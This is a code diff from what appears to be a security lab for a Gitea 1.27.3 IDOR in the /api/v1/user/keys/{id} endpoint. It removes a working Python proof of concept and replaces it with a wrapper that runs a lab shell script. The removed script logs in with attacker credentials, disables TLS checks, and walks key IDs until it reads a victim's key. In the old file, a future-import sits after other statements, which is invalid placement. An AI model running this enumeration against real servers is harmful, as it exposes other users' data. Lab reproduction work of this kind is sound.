@@ -222,70 +222,19 @@ def _cprint(*args, **kwargs):
 print_abraxas_banner()
 _builtins.print = _cprint
 
-from __future__ import annotations
+"""Gitea 1.27.3 GET /api/v1/user/keys/{id} IDOR. Loopback lab client."""
 
-import base64
-import json
-import ssl
+import subprocess
 import sys
-import urllib.error
-import urllib.request
+from pathlib import Path
 
-BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:18101").rstrip("/")
-WITNESS = "GHSA-GITEA-KEY-IDOR-WITNESS"
-VICTIM = ("victim", "LabPass123!")
-ATTACKER = ("attacker", "LabPass123!")
-CTX = ssl._create_unverified_context()
+LAB = Path(__file__).resolve().parent / "lab"
 
 
-def req(method: str, path: str, data: dict | None = None, auth: tuple[str, str] | None = None) -> tuple[int, str]:
-    hdrs = {"Content-Type": "application/json", "User-Agent": "gitea-key-idor-lab"}
-    if auth:
-        tok = base64.b64encode(f"{auth[0]}:{auth[1]}".encode()).decode()
-        hdrs["Authorization"] = "Basic " + tok
-    body = None if data is None else json.dumps(data).encode()
-    r = urllib.request.Request(BASE + path, data=body, headers=hdrs, method=method)
-    try:
-        with urllib.request.urlopen(r, timeout=30, context=CTX) as resp:
-            return resp.status, resp.read().decode("utf-8", "replace")
-    except urllib.error.HTTPError as exc:
-        return exc.code, exc.read().decode("utf-8", "replace")
-
-
-def main() -> None:
-    print(f"IOC base={BASE}")
-    s, b = req("GET", "/api/v1/version")
-    print(f"IOC version status={s} snippet={b[:120]!r}")
-
-    s_own, b_own = req("GET", "/api/v1/user/keys", auth=ATTACKER)
-    print(f"IOC attacker-list status={s_own} snippet={b_own[:180]!r}")
-    if s_own != 200:
-        print("FAIL attacker cannot list own keys")
-        raise SystemExit(1)
-    if WITNESS in b_own:
-        print("FAIL witness already in attacker key list (fixture leak)")
-        raise SystemExit(1)
-
-    hit = None
-    for i in range(1, 32):
-        s, b = req("GET", f"/api/v1/user/keys/{i}", auth=ATTACKER)
-        print(f"IOC get id={i} status={s} snippet={b[:160]!r}")
-        if s == 200 and WITNESS in b:
-            hit = (i, b)
-            break
-    if not hit:
-        print("FAIL no foreign key with witness")
-        raise SystemExit(1)
-
-    kid, body = hit
-    own_ids = {k.get("id") for k in json.loads(b_own)}
-    if kid in own_ids:
-        print("FAIL hit id belongs to attacker")
-        raise SystemExit(1)
-    print(f"IOC idor-id={kid} attacker-ids={sorted(own_ids)}")
-    print("SUCCESS Gitea #1 user/keys IDOR")
+def main() -> int:
+    return subprocess.call(["bash", str(LAB / "run.sh"), *sys.argv[1:]], cwd=LAB)
 
 
 if __name__ == "__main__":
-    main()
+    raise SystemExit(main())
 
